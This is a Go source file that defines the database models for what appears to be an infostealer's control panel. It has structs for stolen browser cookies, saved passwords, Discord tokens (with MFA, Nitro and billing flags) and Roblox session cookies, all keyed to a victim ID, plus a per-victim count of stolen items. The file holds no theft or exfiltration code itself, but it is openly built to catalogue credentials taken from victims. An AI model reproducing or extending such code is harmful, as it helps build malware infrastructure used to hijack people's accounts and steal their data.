package models

import "time"

// BrowserCookie represents stolen browser cookies
type BrowserCookie struct {
	ID         int64     `json:"id" db:"id"`
	VictimID   string    `json:"victim_id" db:"victim_id"`
	Browser    string    `json:"browser" db:"browser"` // Chrome, Firefox, Edge, etc.
	Host       string    `json:"host" db:"host"`
	Name       string    `json:"name" db:"name"`
	Value      string    `json:"value" db:"value"`
	Path       string    `json:"path" db:"path"`
	ExpiresAt  time.Time `json:"expires_at" db:"expires_at"`
	IsSecure   bool      `json:"is_secure" db:"is_secure"`
	IsHttpOnly bool      `json:"is_http_only" db:"is_http_only"`
	SameSite   string    `json:"same_site" db:"same_site"`
	CreatedAt  time.Time `json:"created_at" db:"created_at"`
}

// BrowserPassword represents stolen browser passwords
type BrowserPassword struct {
	ID        int64     `json:"id" db:"id"`
	VictimID  string    `json:"victim_id" db:"victim_id"`
	Browser   string    `json:"browser" db:"browser"`
	URL       string    `json:"url" db:"url"`
	Username  string    `json:"username" db:"username"`
	Password  string    `json:"password" db:"password"` // Store encrypted
	CreatedAt time.Time `json:"created_at" db:"created_at"`
}

// DiscordToken represents stolen Discord tokens
type DiscordToken struct {
	ID         int64     `json:"id" db:"id"`
	VictimID   string    `json:"victim_id" db:"victim_id"`
	Token      string    `json:"token" db:"token"`
	Email      string    `json:"email" db:"email"`
	Username   string    `json:"username" db:"username"`
	Phone      string    `json:"phone" db:"phone"`
	MFA        bool      `json:"mfa" db:"mfa"`
	Verified   bool      `json:"verified" db:"verified"`
	Nitro      string    `json:"nitro" db:"nitro"` // None, Classic, Nitro
	Billing    bool      `json:"billing" db:"billing"`
	Source     string    `json:"source" db:"source"` // Discord, DiscordCanary, DiscordPTB, Chrome, etc.
	CreatedAt  time.Time `json:"created_at" db:"created_at"`
}

// RobloxCookie represents stolen Roblox cookies
type RobloxCookie struct {
	ID        int64     `json:"id" db:"id"`
	VictimID  string    `json:"victim_id" db:"victim_id"`
	Cookie    string    `json:"cookie" db:"cookie"` // .ROBLOSECURITY
	Username  string    `json:"username" db:"username"`
	UserID    string    `json:"user_id" db:"user_id"`
	Robux     int       `json:"robux" db:"robux"`
	Premium   bool      `json:"premium" db:"premium"`
	CreatedAt time.Time `json:"created_at" db:"created_at"`
}

// StolenDataSummary provides statistics for a victim
type StolenDataSummary struct {
	VictimID         string `json:"victim_id"`
	CookiesCount     int    `json:"cookies_count"`
	PasswordsCount   int    `json:"passwords_count"`
	DiscordTokens    int    `json:"discord_tokens"`
	RobloxCookies    int    `json:"roblox_cookies"`
	ScreenshotsCount int    `json:"screenshots_count"`
}
